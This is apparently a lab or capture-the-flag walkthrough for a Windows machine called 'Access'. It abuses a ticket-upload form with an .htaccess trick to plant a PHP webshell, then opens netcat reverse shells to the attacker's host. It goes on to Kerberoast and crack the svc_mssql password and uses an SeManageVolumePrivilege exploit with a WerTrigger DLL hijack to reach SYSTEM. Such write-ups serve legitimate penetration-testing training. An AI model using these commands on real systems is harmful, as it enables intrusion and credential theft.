_____
# Exploitation Guide for Access

## Summary

In this guide, we'll leverage a file upload function on a web application to upload a php webshell and gain a foothold. We will then escalate to svc_myql and abuse SeManageVolumePrivilege to gain system access on the target.

## Enumeration

### Nmap

We begin with an nmap scan.

```
┌──(kali㉿kali)-[~]
└─$ nmap 192.168.120.107 -p- -Pn 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-11 07:32 EDT
Nmap scan report for 192.168.120.107
Host is up (0.24s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5357/tcp  open  wsdapi
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49697/tcp open  unknown
49747/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 433.59 seconds
```

According to nmap, a webserver is operating on port 80. When we go to the website, we are presented to an Event page, which includes speakers, timetables, events, a gallery, and the ability to purchase tickets. The option to buy tickets includes a functionality to upload images.

## Exploitation

The purchase tickets upload function prevents users from submitting files with extensions that allow php code execution such as:

```
[ .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .phar and .inc ]
```

We notice that users can upload **.htaccess** files. We can take advantage of this to get code execution. More information can be found [here](https://www.onsecurity.io/blog/file-upload-checklist/#uploading-a-htaccess-file).

The **.htaccess** file is not an RCE vector by itself, but it allows the creation of new legitimate PHP extensions that are allowed by the web application.

### Exploiting .htaccess to get RCE

We create our new **.htaccess** file which includes a new allowed extension of `.evil`.

```
┌──(kali㉿kali)-[~]
└─$ cat .htaccess 
AddType application/x-httpd-php .evil
```

We then upload it to the target using the "Upload Image" form in the "Buy Tickets" function of the website.

We will also need a PHP webshell. Let's use [wwwolf-php-webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell), and change the extension to `.evil` before uploading it using the same method as before.

We now need to figure out where it was uploaded to. Let's use `Gobuster` to find out where the files are being uploaded.

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.120.107 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.120.107
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/11 07:33:16 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 344] [--> http://192.168.120.107/uploads/]
/assets               (Status: 301) [Size: 343] [--> http://192.168.120.107/assets/] 
/forms                (Status: 301) [Size: 342] [--> http://192.168.120.107/forms/] 
```

The **uploads** directory looks promising. Command execution can be achieved by accessing the uploaded file available at [http://192.168.120.107/uploads/webshell.evil](http://192.168.120.107/uploads/webshell.evil)

Using the webshell, we can upload `nc.exe` and use it to connect back to a `netcat` listener .

Let's start our listener.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
```

Then, execute **nc.exe** from the webshell.

```
.\nc.exe 192.168.36.128 9001 -e cmd.exe
```

We then receive the connection on our listener.

```
connect to [192.168.118.23] from (UNKNOWN) [192.168.120.107] 49884
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\uploads>whoami && hostname 
whoami && hostname 
access\svc_apache
SERVER

C:\xampp\htdocs\uploads>
```

We have achieved shell access on the target system. For ease, let's start `powershell` and begin local enumeration.

```
C:\xampp\htdocs\uploads>powershell 
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\uploads>
```

### Privilege Escalation to svc_mssql

Exploring the target, we notice a user named `svc_mssql` while enumerating users.

```powershell
PS C:\xampp\htdocs\uploads> net users
net users

User accounts for \\SERVER

-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt                   
svc_apache               svc_mssql                
The command completed successfully.
```

Let's utilize [`PowerView`](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) to find out more about the `svc_mssql` user. Using the webshell from before, we can upload the **PowerView.ps1** script to the target and execute it.

```powershell
PS C:\xampp\htdocs\uploads> import-module .\PowerView.ps1
import-module .\PowerView.ps1
PS C:\xampp\htdocs\uploads> Get-netuser svc_mssql
Get-netuser svc_mssql


company               : Access
logoncount            : 1
badpasswordtime       : 12/31/1600 4:00:00 PM
distinguishedname     : CN=MSSQL,CN=Users,DC=access,DC=offsec
objectclass           : {top, person, organizationalPerson, user}
lastlogontimestamp    : 4/8/2022 2:40:02 AM
name                  : MSSQL
objectsid             : S-1-5-21-537427935-490066102-1511301751-1104
samaccountname        : svc_mssql
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 4/8/2022 9:40:02 AM
instancetype          : 4
usncreated            : 16414
objectguid            : 05153e48-7b4b-4182-a6fe-22b6ff95c1a9
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
dscorepropagationdata : 1/1/1601 12:00:00 AM
serviceprincipalname  : MSSQLSvc/DC.access.offsec
givenname             : MSSQL
lastlogon             : 4/8/2022 2:40:02 AM
badpwdcount           : 0
cn                    : MSSQL
useraccountcontrol    : NORMAL_ACCOUNT
whencreated           : 4/8/2022 9:39:43 AM
primarygroupid        : 513
pwdlastset            : 4/8/2022 2:39:43 AM
usnchanged            : 16420
```

We can see that this account is configured with a "serviceprincipalname" or `SPN`. Armed with this information, we can perform a `kerberoasting` attack.

### Kerberoasting

We'll use [Rubeus](https://github.com/GhostPack/Rubeus) to acquire the the `TGS` of the user `svc_mssql` and then use `hashcat` or `JohnTheRipper` to crack the hash.

A compiled version of **Rubeus.exe** can be found at https://github.com/r3motecontrol/Ghostpack-CompiledBinaries. Let's download this executable and upload it to the target using our webshell. We can then execute it and obtain the hash for the service account.

```powershell
PS C:\xampp\htdocs\uploads> ./Rubeus.exe kerberoast /nowrap
./Rubeus.exe kerberoast /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0 

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : access.offsec
[*] Searching path 'LDAP://SERVER.access.offsec/DC=access,DC=offsec' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MSSQL,CN=Users,DC=access,DC=offsec
[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec
[*] PwdLastSet             : 10/10/2021 6:29:22 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$3C74878DC5D1C84A5CE29B54F565D711$85015D3D2D4FF03408D8758660BACEA9B51AD52F7C778016DFAA9E21E2FB0051BCEC910F28DF19CAE394160B6172896D41D04FF2ABED95A17B02A5828A0941E010B6E8F46EE7F296E36696C97F5E5B9FF49477FBAC137543C14584EE1E0C3F813970C1EDD2FF2A1121FBB6090D3A5D7F2DFABBDB24AD146C21430A9C0E786CB00FA9415A48864EF13BCE070113494C8B1AD95960B675ECB160DC04BCAEE9037A41FEE6D872F1E10EF5E9811621D03067B6AF566833F11405478E37275C27ED1391B561F2887CF86AAE5FAFE1FFB9A179B6E4B2EE579B08E9294E47434EECBF2CFD79E88687F4B1A92A9184401B3608A28100BF6870C6AC15BDE1DA93EAB61F8271C0C560E42B0EAB3C64C7E5604064E4A7AF5241DB5BE3216F4573BAC763A8443A637384BF2C56A23FAC6A45729A3A4A4467127DE954EAC38722A2B7257DFBA85EE26D4DCF68C372CA1CE1ABA9B6A35336883CDBE86BBCF9A8ED291C677D9F89681D5B720FD1A367E7D7D581949209ECDCA1834973653618052F1768353DEF396EC98B109FA6BC5F42FD3EB6B75CC7A33344CDBD5F21E995DC4EF9160BE8EA5E78EC1EE09ECE05A430416ABDCAB727811F5406E4FDBED62B0DA250F0DBB3DF7CFE7CB8302161CB86F8FD65E5505C01DF08E3F878D3706F5DC229489B8C3D6FA7358A9AD226A52E7582EE0131E3F814DE64AC3CB9CDC2FDAD93C6F6EDED631353CB2B7D87AD198FF56A3340798252726FCC4D6C741B41562216AB67332CFF28F34D71DA85D8045154AFBEA8BCEA3B2ED85E379207A7D772249E7F1B81BFD3DF9D2A1BE9E3BB6BA19C4536BEDFA3044F443EA26A8C755C1F5A17479E749E0D6D78A813207B49EFFEDEE2E023CE672A0121C8D9A273CF61620587F90CE65C364684186A5B9FB3C53BAEF50149AAAF0071A5672D4B81E522CAF033FE5E1BCE62280285828262DD8E169F20B38E500E5E7C63688E99CA124B8B01A40A0AFAD7537EB26BFFDD07ED239E9C852F71D8D21014ACAFABBF627A2983A35C08387202AD8A7177A916EA7931A9E6587DC214F4336A7450B2EEBF82E9462C05D46F40023352E8D41B4CB22566FF4902B24114D8983D64C232BBEEECB51FE943D1D755CF64ADD8422A8070EC1C1C5BE0872C31477B0D77467A7F09BF4DB1FFDBEC38E8EA70048F5CC4F45536AE5FEF1B228BC58C4EE2788DF217521EFB95A5B7F9E070A2E81E717E34B8F29EF7056FEBE6EB3800211F5CA909F17F8000B9C9873753BCE7326471D14D1349F54176F47F720F955EC85033D0260B57E9D10BBAA5FD9A1A9F39D1D8FE5E71ADC6788878A730DDBA83C688C69E949B067C9F1D7E6867E2E9E0B6E230BF63B0EB6FE0A49026482F97AFB6FAE88FECCCBB332101F8B842221069BF57B8A62436C230CB93C403BD45124F9BDF98BA07A635EC4A9BE321B5264B57DD546EF10344D5CA544CA1566FA2F6584A767BF349
```

We can copy this hash to a file named **svc_mssql_hash**.

```
┌──(kali㉿kali)-[~]
└─$ cat svc_mssql_hash 
$krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$3C74878DC5D1C84A5CE29B54F565D711$85015D3D2D4FF03408D8758660BACEA9B51AD52F7C778016DFAA9E21E2FB0051BCEC910F28DF19CAE394160B6172896D41D04FF2ABED95A17B02A5828A0941E010B6E8F46EE7F296E36696C97F5E5B9FF49477FBAC137543C14584EE1E0C3F813970C1EDD2FF2A1121FBB6090D3A5D7F2DFABBDB24AD146C21430A9C0E786CB00FA9415A48864EF13BCE070113494C8B1AD95960B675ECB160DC04BCAEE9037A41FEE6D872F1E10EF5E9811621D03067B6AF566833F11405478E37275C27ED1391B561F2887CF86AAE5FAFE1FFB9A179B6E4B2EE579B08E9294E47434EECBF2CFD79E88687F4B1A92A9184401B3608A28100BF6870C6AC15BDE1DA93EAB61F8271C0C560E42B0EAB3C64C7E5604064E4A7AF5241DB5BE3216F4573BAC763A8443A637384BF2C56A23FAC6A45729A3A4A4467127DE954EAC38722A2B7257DFBA85EE26D4DCF68C372CA1CE1ABA9B6A35336883CDBE86BBCF9A8ED291C677D9F89681D5B720FD1A367E7D7D581949209ECDCA1834973653618052F1768353DEF396EC98B109FA6BC5F42FD3EB6B75CC7A33344CDBD5F21E995DC4EF9160BE8EA5E78EC1EE09ECE05A430416ABDCAB727811F5406E4FDBED62B0DA250F0DBB3DF7CFE7CB8302161CB86F8FD65E5505C01DF08E3F878D3706F5DC229489B8C3D6FA7358A9AD226A52E7582EE0131E3F814DE64AC3CB9CDC2FDAD93C6F6EDED631353CB2B7D87AD198FF56A3340798252726FCC4D6C741B41562216AB67332CFF28F34D71DA85D8045154AFBEA8BCEA3B2ED85E379207A7D772249E7F1B81BFD3DF9D2A1BE9E3BB6BA19C4536BEDFA3044F443EA26A8C755C1F5A17479E749E0D6D78A813207B49EFFEDEE2E023CE672A0121C8D9A273CF61620587F90CE65C364684186A5B9FB3C53BAEF50149AAAF0071A5672D4B81E522CAF033FE5E1BCE62280285828262DD8E169F20B38E500E5E7C63688E99CA124B8B01A40A0AFAD7537EB26BFFDD07ED239E9C852F71D8D21014ACAFABBF627A2983A35C08387202AD8A7177A916EA7931A9E6587DC214F4336A7450B2EEBF82E9462C05D46F40023352E8D41B4CB22566FF4902B24114D8983D64C232BBEEECB51FE943D1D755CF64ADD8422A8070EC1C1C5BE0872C31477B0D77467A7F09BF4DB1FFDBEC38E8EA70048F5CC4F45536AE5FEF1B228BC58C4EE2788DF217521EFB95A5B7F9E070A2E81E717E34B8F29EF7056FEBE6EB3800211F5CA909F17F8000B9C9873753BCE7326471D14D1349F54176F47F720F955EC85033D0260B57E9D10BBAA5FD9A1A9F39D1D8FE5E71ADC6788878A730DDBA83C688C69E949B067C9F1D7E6867E2E9E0B6E230BF63B0EB6FE0A49026482F97AFB6FAE88FECCCBB332101F8B842221069BF57B8A62436C230CB93C403BD45124F9BDF98BA07A635EC4A9BE321B5264B57DD546EF10344D5CA544CA1566FA2F6584A767BF349
```

Using `JohnTheRipper` and the **/usr/share/wordlists/rockyou.txt** wordlist, we discover that password for svc_mssql is `trustno1`.

```
┌──(kali㉿kali)-[~/Desktop/PG-Practice]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt svc_mssql_hash 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
trustno1         (?)     
1g 0:00:00:00 DONE (2022-04-11 09:20) 100.0g/s 102400p/s 102400c/s 102400C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Next we will use [RunAsCs](https://github.com/antonioCoco/RunasCs) to get shell as `svc_mssql` on the target. Let's grab a copy of **Invoke-RunasCs.ps1** from the repository and upload it to the target by using the webshell.

In our shell on the target system, let's import the `Invoke-RunasCs` finction and then test it by running `whoami`.

```powershell
PS C:\xampp\htdocs\uploads> import-module .\Invoke-RunasCs.ps1
import-module .\Invoke-RunasCs.ps1
PS C:\xampp\htdocs\uploads> Invoke-RunasCs svc_mssql trustno1 whoami
Invoke-RunasCs svc_mssql trustno1 whoami
access\svc_mssql

PS C:\xampp\htdocs\uploads> 
```

Then, we start netcat on the our kali machine and use `Invoke-RunasCs` to execute `nc.exe` on the target to initiate a reverse shell connection.

```powershell
PS C:\xampp\htdocs\uploads> Invoke-RunasCs svc_mssql trustno1 'c:/xampp/htdocs/uploads/nc.exe 192.168.118.23 4444 -e cmd.exe'
```

We should then recieve a connection to our listener.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.118.23] from (UNKNOWN) [192.168.120.107] 49954
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami && hostname
whoami && hostname
access\svc_mssql
SERVER
```

We have successfully compromised the `svc_mssql` account!

## Escalation

Enumeration privleges, we discover that `SeManageVolumePrivilege` is assigned to the `svc_mssql` account. We can take advantage of this privilege to get Administrator access to the target.

```powershell
C:\Users\svc_mssql\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State   
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
```

**Reference** :

- [https://twitter.com/0gtweet/status/1303432729854439425](https://twitter.com/0gtweet/status/1303432729854439425)
- [https://github.com/CsEnox/SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit)

### Exploiting SeManageVolumePrivilege

According to [this github repository](https://github.com/CsEnox/SeManageVolumeExploit):

```
This exploit grants full permission on C:\ drive for all users on the machine.

-   Enables the privilege in the token
-   Creates handle to \.\C: with SYNCHRONIZE | FILE_TRAVERSE
-   Sends the FSCTL_SD_GLOBAL_CHANGE to replace S-1-5-32-544 with S-1-5-32-545
```

Let's grab the compiled executable from the [releases](https://github.com/CsEnox/SeManageVolumeExploit/releases) page.

We upload **SeManageVolumeExploit.exe** to the target and execute it. After execution, we discover that the `Builtin Users group` has full permissions on the Windows folder.

```powershell
C:\xampp\htdocs\uploads>whoami
access\svc_mssql

C:\xampp\htdocs\uploads>SeManageVolumeExploit.exe
Entries changed: 865
DONE 

C:\xampp\htdocs\uploads>icacls C:/Windows
C:/Windows NT SERVICE\TrustedInstaller:(F)
           NT SERVICE\TrustedInstaller:(CI)(IO)(F)
           NT AUTHORITY\SYSTEM:(M)
           NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
           BUILTIN\Users:(M)
           BUILTIN\Users:(OI)(CI)(IO)(F)
```

Let's use WerTrigger from https://github.com/sailay1996/WerTrigger to acquire a SYSTEM shell.

To set it up we need to:

1. Copy **phoneinfo.dll** to *_C:\Windows\System32*_
2. Place **Report.wer** file and **WerTrigger.exe** in a same directory.
3. Run **WerTrigger.exe**.

```powershell
C:\xampp\htdocs\uploads\enox>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is CCC2-BF17

 Directory of C:\xampp\htdocs\uploads\enox

10/10/2021  07:25 PM    <DIR>          .
10/10/2021  07:25 PM    <DIR>          ..
10/10/2021  07:23 PM             9,252 Report.wer
10/10/2021  07:23 PM            15,360 WerTrigger.exe
               2 File(s)         24,612 bytes
               2 Dir(s)  50,123,882,496 bytes free

C:\xampp\htdocs\uploads\enox>WerTrigger.exe
WerTrigger.exe
c:/xampp/htdocs/uploads/nc.exe 192.168.118.23 4444 -e cmd.exe
```

Note : `WerTrigger.exe` will not produce any output and will just wait for you to type the instructions you want to perform.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.118.23] from (UNKNOWN) [192.168.120.107] 49998
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami && hostname 
whoami && hostname 
nt authority\system
SERVER

C:\Windows\system32>
```

We now have system level access on the target machine!
